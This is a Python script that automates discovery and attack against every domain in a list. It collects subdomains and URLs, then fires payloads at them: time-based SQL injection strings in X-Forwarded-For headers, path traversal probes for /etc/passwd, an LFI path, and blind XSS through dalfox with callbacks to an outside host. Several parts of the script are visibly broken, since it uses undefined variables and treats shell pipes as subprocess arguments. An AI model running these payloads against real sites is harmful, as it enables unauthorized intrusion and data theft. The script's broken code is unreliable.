import subprocess
from urllib.parse import urlparse
import requests
import os
import time

def print_banner():
    banner = r"""
    ________    _______  ___________         .____    .___ _______  _____________________ 
    \_____  \   \      \ \_   _____/         |    |   |   |\      \ \_   _____/\______   \
    /    |   \  /   |   \ |    __)_   ______ |    |   |   |/   |   \ |    __)_  |       _/
    /    |    \/    |    \|        \ /_____/ |    |___|   /    |    \|        \ |    |   \
    \_______  /\____|__  /_______  /         |_______ \___\____|__  /_______  / |____|_  /
            \/         \/        \/                  \/           \/        \/         \/ 
    """
    print(banner)

print_banner()

liste = input("Please enter the name of the domain file: ")

dork = input("Enter Dork Links List (optional, you can leave it blank): ")

try:
    subfinder_output = subprocess.check_output(["subfinder", "-dL", liste]).decode()
    subdomains = subfinder_output.splitlines()
except subprocess.CalledProcessError as e:
    print(f"[-] Error: An error occurred while running Subfinder: {e}")
    exit()

parameters = []
for subdomain in subdomains:
    try:
        wayback_output = subprocess.check_output(["waybackurls", subdomain]).decode()
    except subprocess.CalledProcessError as e:
        print(f"[-] Error: An error occurred while running Waybackurls({subdomain}): {e}")
        continue
    
    for line in wayback_output.splitlines():
        if "?" in line:
            parameters.append(line)

if dork:
    with open(dork, "r") as f:
        dork_lines = f.readlines()
        parameters.extend(dork_lines)

with open("parameters.txt", "w") as f:
    for parameter in parameters:
        f.write(parameter + "\n")

with open("parameters.txt", "r") as f:
    urls = f.read().splitlines()

subprocess.run(["subfinder", "-dL", liste, "-o", "domain.txt"])

subprocess.run(["httpx", "-l", "domain.txt", "-o", "httpx.txt"])

gau_output = subprocess.check_output(["gau", "--threads", "5"] + subdomains).decode()
with open("Endpoints.txt", "w") as f:
    f.write(gau_output)
print("[+] XSS Control 1 Started...")
katana_output = subprocess.check_output(["katana", "-jc"] + httpx_output).decode()
with open("Endpoints.txt", "a") as f:
    f.write(katana_output)

uro_output = subprocess.check_output(["uro"], input="\n".join(gau_output + katana_output).encode()).decode()
with open("Endpoints_F.txt", "w") as f:
    f.write(uro_output)

gf_output = subprocess.check_output(["gf", "xss"], input=uro_output.encode()).decode()
with open("XSS.txt", "w") as f:
    f.write(gf_output)

gxss_output = subprocess.check_output(["Gxss", "-p", "khXSS", "-o", "XSS_Ref.txt"], input=gf_output.encode()).decode()

dalfox_output = subprocess.check_output(["dalfox", "file", "XSS_Ref.txt", "-o", "Vulnerable_XSS.txt"]).decode()
print("[+] XSS Control 1 Completed.")

print("[+] SQL Injection Scan 2 Started...")
sql1_output = subprocess.check_output(["httpx", "-silent", "-mc", "You have an error in your SQL syntax"], input="\n".join(parameters).encode()).decode()
with open("sql1.txt", "w") as f:
    f.write(sql1_output)
print("[+] SQL Injection Scan 2 Completed.")

print("[+] Fuzzing Control Started...")
nuclei_output = subprocess.check_output(["nuclei", "-l", "parameters.txt", "-t", "fuzzing-templates", "-o", "FUZZRapor.txt"]).decode()
print("[+] Fuzzing Check Completed.")

print("[+] Template Control Started...")
nuclei_output = subprocess.check_output(["nuclei", "-l", "parameters.txt", "-t", "nuclei-templates", "-o", "Nuclei.txt"]).decode()
print("[+] Template Check Completed.")

print("[+] SQL Injection Scan 3 Started...")
sql3_output = subprocess.check_output(["httpx", "-silent", "-H", "X-Forwarded-For: 'XOR(if (now()=sysdate(), sleep (13),0))OR'", "-rt", "-timeout", "20", "-mrt", ">13", "-o", "sql3.txt"], input="\n".join(parameters).encode()).decode()
print("[+] SQL Injection Scan 3 Completed.")

print("[+] HTTP API Control Started...")
public_output = subprocess.check_output(["httpx", "-silent", "-o", "public.txt"] + ["grep", "-E", "/api/index.php/v1/config/application?public=true", "|", "httpx", "-silent", "-mc", "200", "-o", "public.txt"]).decode()
print("[+] HTTP API Check Completed.")

print("[+] LFI Check Started...")
lfi_output = subprocess.check_output(["httpx", "-l", "domain.txt", "-path", "/assets/built%2F..%2F..%2F/package.json", "-status-code", "-mc", "200", "-o", "lfi.txt"]).decode()
print("[+] LFI Check Completed.")

print("[+] XSS Control 2 Started...")
xss2_output = subprocess.check_output(["getJS", "|", "httpx", "--match-regex", "addEventListener\((?:\\'|\\\")(message)(?:\\'|\\\")", "-silent"]).decode()
with open("xss2.txt", "w") as f:
    f.write(xss2_output)
print("[+] XSS Check 2 Completed.")

print("[+] SQL Injection Scan Started...")
sql5_output = subprocess.check_output(["httpx", "-silent", "-H", "X-Forwarded-For: '; waitfor delay '0:0:6' -- ", "-rt", "-timeout", "20", "-mrt", ">13", "-o", "sql5.txt"], input="\n".join(parameters).encode()).decode()
print("[+] SQL Injection Scan Completed.")

print("[+] SQL Injection Scan Started...")
parameters_http_output = subprocess.check_output(["grep", "-v", "-e", "js", "-e", "css", "-e", "svg", "-e", "png", "-e", "jpg", "-e", "eot", "-e", "ttf", "-e", "woff"] + ["httpx", "-mc", "200", "-silent"], input="\n".join(parameters).encode()).decode()
with open("parameters_http.txt", "w") as f:
    f.write(parameters_http_output)
print("[+] SQL Injection Scan Completed.")


print("[+] SQL Injection Scan Started...")
sql6_output = subprocess.check_output(["parallel", "-j50", "httpx", "--silent", "-H", "'X-Forwarded-For: '\''XOR(if (now()=sysdate(), sleep (13),0))OR'\''", "-rt", "-timeout", "20", "-mrt", "'>13'"], input=parameters_http_output.encode()).decode()
with open("sql6.txt", "w") as f:
    f.write(sql6_output)
print("[+] SQL Injection Scan Completed.")

print("[+] Path Traversal Control Started..")
path_traversal_output = subprocess.check_output(["httpx", "-l", "parameters.txt", "-path", "'///////../../../../../../etc/passwd'", "-status-code", "-mc", "200", "-ms", "'root:'", "-o", "path_traversal.txt"]).decode()
print("[+] Path Traversal Check Completed.")

print("[+] Gospider Control Started...")
gospider_output = subprocess.check_output(["gospider", "-S", "httpx_results.txt", "-c", "10", "-d", "5", "--blacklist", "'.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)'", "--other-source"], input="\n".join(subdomains).encode()).decode()
result_output = subprocess.check_output(["grep", "-e", "code-200", "|", "awk", "'{print $5}'", "|", "grep", "=", "|", "qsreplace", "-a", "|", "dalfox", "pipe"]).decode()
with open("result.txt", "w") as f:
    f.write(result_output)
print("[+] Gospider Check Completed.")

print("[+] SQL Injection Scan Started...")
blindsqli_output = subprocess.check_output(["grep", "="] + ["qsreplace", "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"], input="\n".join(parameters).encode()).decode()
with open("blindsqli.txt", "w") as f:
    f.write(blindsqli_output)
print("[+] SQL Injection Scan Completed.")

print("[+] XSS Control 3 Started...")
xss3_output = subprocess.check_output(["getJS", "|", "httpx", "--match-regex", "addEventListener\((?:\\'|\\\")(message)(?:\\'|\\\")", "-silent"]).decode()
with open("xss3.txt", "w") as f:
    f.write(xss3_output)
print("[+] XSS Check 3 Completed.")


print("[+] XSS Control 4 Started...")
xss_taramasi_output = ""
with open(liste, "r") as f:
    sites = f.readlines()
    for site in sites:
        gau_output = subprocess.check_output(["gau", "--subs", site]).decode()
        gau_lines = gau_output.splitlines()
        for line in gau_lines:
            if line.startswith("https://") and "=" in line:
                uro_output = subprocess.check_output(["uro"], input=line.encode()).decode()
                dalfox_output = subprocess.check_output(["dalfox", "pipe", "--deep-domxss", "--multicast", "--blind", "https://chirag.bxss.in"], input=uro_output.encode()).decode()
                xss_taramasi_output += dalfox_output 
print("[+] XSS Check 4 Completed.")


with open("all_result.txt", "w") as f:
     tasks = [
    ("SQL Injection Scan Results", sql1_output, "parameters.txt"),
    ("Fuzzing Control Results", nuclei_output, "parameters.txt"),
    ("Template Check Results", nuclei_output2, "parameters.txt"),
    ("SQL Injection Scan Results", sql3_output, "parameters.txt"),
    ("HTTP API Check Results", public_output, "parameters.txt"),
    ("LFI Check Results", lfi_output, "domain.txt"),
    ("XSS Check 2 Results", xss2_output, "parameters.txt"),
    ("SQL Injection Scan Results", sql5_output, "parameters.txt"),
    ("SQL Injection Scan Results", sql6_output, "parameters.txt"),
    ("SQL Injection Scan Results", blindsqli_output, "parameters.txt"),
    ("Path Traversal Check Results", path_traversal_output, "parameters.txt"),
    ("Gospider Control Results", gospider_output, "domain.txt"),
    ("XSS Check 3 Results", xss3_output, "parameters.txt"),
    ("XSS Scan Results", xss_taramasi_output, "domain.txt"),
    ("Tüm Sonuçlar", all_results, "parameters.txt"),
    ]  

with open("all_result.txt", "w") as f:
    for task_name, task_output, task_list in tasks:
        f.write("##########################################################\n")
        f.write(f"[+] {task_name} ({task_list}):\n")
        f.write("##########################################################\n")
        f.write(f"{task_output}\n\n")


